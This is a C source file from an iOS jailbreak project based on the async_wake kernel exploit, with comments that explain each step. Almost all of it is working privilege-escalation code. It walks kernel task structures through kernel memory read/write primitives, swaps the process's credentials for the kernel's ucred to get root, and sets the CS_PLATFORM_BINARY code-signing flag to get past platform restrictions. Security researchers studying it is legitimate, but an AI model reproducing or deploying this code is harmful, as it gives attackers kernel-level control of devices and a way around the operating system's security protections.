//
//  root.c
//  async_wake_ios
//
//  Created by Etienne Stalmans on 14/12/2017.
//  Copyright © 2017 Ian Beer. All rights reserved.
//
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/fcntl.h>

#include "kdbg.h"
#include "kutils.h"
#include "kmem.h"
#include "symbols.h"
#include "kcall.h"
#include "find_port.h"
#include "root.h"


// Thanks to
// Abraham Masri @cheesecakeufo https://gist.github.com/iabem97/d11e61afa7a0d0a9f2b5a1e42ee505d8
// @benjibobs https://github.com/benjibobs/async_wake
// This is all based off of their code and commented with my understanding of what is going on

// this is essentially the exact same function as
// uint64_t find_kernel_vm_map(uint64_t task_self_addr) {
// found in async_wake.c:437
// but we return the bsd_info rather than the vm_map
uint64_t get_process_bsdinfo(uint32_t pid) {
    
    // task_self_addr points to the struct ipc_port for our task port
    uint64_t task_self = task_self_addr();
    // read the address of the task struct
    uint64_t struct_task = rk64(task_self + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
    
    //loop through the task structures to find the task structure for the supplied pid
    while (struct_task != 0 ) {
        // from async_wake.c:440 - where Ian loops to find the kernel vm_map
        uint64_t bsd_info = rk64(struct_task + koffset(KSTRUCT_OFFSET_TASK_BSD_INFO));
        uint32_t tpid = rk32(bsd_info + koffset(KSTRUCT_OFFSET_PROC_PID));
        
        if (tpid == pid) {
            return bsd_info;
        }
        struct_task = rk64(struct_task + koffset(KSTRUCT_OFFSET_TASK_PREV));
    }
   
    return -1;
}

uint64_t get_process_bsdinfo_from_name(char* procname){
    
    // task_self_addr points to the struct ipc_port for our task port
    uint64_t task_self = task_self_addr();
    // read the address of the task struct
    uint64_t struct_task = rk64(task_self + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
    
    //loop through the task structures to find the task structure for the supplied pid
    while (struct_task != 0 ) {
        // from async_wake.c:440 - where Ian loops to find the kernel vm_map
        uint64_t bsd_info = rk64(struct_task + koffset(KSTRUCT_OFFSET_TASK_BSD_INFO));
        
        // create a buffer to hold the process name
        char buff [strlen(procname)];
        // read the process name, we only read of strlen("target process")
        rkbuffer(bsd_info+koffset(KSTRUCT_OFFSET_PROC_COMM),buff,(uint32_t)strlen(procname));
        
        //check if it is the pocess we are looking for
        if (strcmp(procname, buff) == 0) {
            return bsd_info;
        }
        struct_task = rk64(struct_task + koffset(KSTRUCT_OFFSET_TASK_PREV));
    }
    
    return -1;
}

//get the current value of cflags for a given process.
//requires the memory location of the cflags, use get_csflags_loc to retrieve this
uint32_t get_csflags(){
    uint64_t proc_bsd = get_process_bsdinfo(getpid());
    uint32_t csflags = rk32(proc_bsd + koffset(KSTRUCT_OFFSET_CFLAGS));
    return csflags;
}

//sets the csflags of a process. Takes the memory location of the csflags to set
//get the memory location using get_csflags_loc
uint32_t set_csflags(uint32_t csflag){
    uint64_t proc_bsd = get_process_bsdinfo(getpid());
    uint32_t n_csflags = rk32(proc_bsd + koffset(KSTRUCT_OFFSET_CFLAGS)) | csflag;
    wk32(proc_bsd+koffset(KSTRUCT_OFFSET_CFLAGS), n_csflags);
    return -1;
}

uid_t get_root(){
    uid_t olduid = getuid();
    printf("Current PID: %d, UID: %d\n",getpid(),olduid);
    
    //get the process address for the current process
    printf("Get current process bsd_info\n");
    uint64_t proc_bsd = get_process_bsdinfo(getpid());
    if(proc_bsd == -1) {
        printf("Failed to get current process bsd_info\n");
        return olduid;
    }
    printf("Got bsd_info: %llx\n", proc_bsd);
    
    //get process address for the kernel process
    printf("Get kernel process bsd_info\n");
    uint64_t kernel_bsd = get_process_bsdinfo(0);
    if(kernel_bsd == -1) {
        printf("Failed to get Kernel bsd_info\n");
        return olduid;
    }
    printf("Got bsd_info: %llx\n", kernel_bsd);
    
    /* KSTRUCT
     * been trying to find an example of what the structs look like
     *
     
        KSTRUCT
     +----------------------------+
     |                            |
     +----------------------------+         +----------------+--------+
     |        BSD_INFO            +-------> | Pid : bsd_info + 0x10   |
     |                            |         |                         |
     +----------------------------+         +-----------------+-------+
     |                            |         | ucred: bsd_info + 0x100 |
     |                            |         |                         |
     |                            |         +---------------------+---+
     |                            |         | Proc_name: bsd_info +   |
     |                            |         |            0x268        |
     |                            |         +--------------------+----+
     |                            |         | cs_flags: bsd_info +    |
     |                            |         |           0x2a8         |
     +----------------------------+         +-------------------------+


     * bsd_info + 0x100 - holds the user credentails struct
     * I think it is this -->
     * https://github.com/apple/darwin-xnu/blob/5394bb038891708cd4ba748da79b90a33b19f82e/bsd/sys/ucred.h
     *
     * we want to swap out the ucred struct to match that of the kernel. This means our process now has kernel permissions
     */
    //get the ucred from the kernel KStruct
    printf("Extract kernel ucred\n");
    uint64_t kernel_ucred = rk64(kernel_bsd + koffset(KSTRUCT_OFFSET_UCRED));
    printf("Found kernel_ucred: %llx\n", kernel_ucred);
    
    //overwrite the current ucred with the kernel's ucred
    printf("Replacing current ucred with kernel's\n");
    wk64(proc_bsd + koffset(KSTRUCT_OFFSET_UCRED) , kernel_ucred);
    printf("Successfully stole kern_ucred!\n");
    
    //set our uid to root :D
    setuid(0);
    printf("PID: %d, UID: %d\n",getpid(), getuid());
    
    //return the olduid so we can reset it down the line
    return olduid;
}

void reset_root(uid_t olduid){
    setuid(olduid);
    printf("Reset our UID\n");
    printf("PID: %d, UID: %d\n",getpid(), getuid());
}

void setPlatform(){
    uint32_t c_csflags = get_csflags();
    printf("Current csflags: 0x%08x\n",c_csflags);
    printf("Setting csflags 'CS_PLATFORM_BINARY'\n");
    set_csflags(0x4000000);
    printf("New csflags: 0x%08x\n",get_csflags());
}
